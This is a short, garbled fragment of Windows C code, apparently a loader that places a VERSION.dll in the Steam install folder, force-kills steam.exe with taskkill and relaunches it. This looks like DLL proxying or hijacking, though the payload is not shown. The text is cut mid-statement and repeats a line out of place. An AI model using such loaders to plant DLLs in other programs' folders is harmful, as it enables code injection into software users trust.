        "C:\\Program Files (x86)\\Steam\\VERSION.dll");

    // Kill Steam
    system("taskkill /f /im steam.exe >nul 2>&1");

    // Relaunch
    ShellExecuteA(NULL, "open",
        "C:\\Program Files (x86)\\Steam\\steam.exe",
        NULL, NULL, SW_SHOW);

            "C:\\Program Files (x86)\\Steam\\VERSION.dll");
    }
    return 0;
}
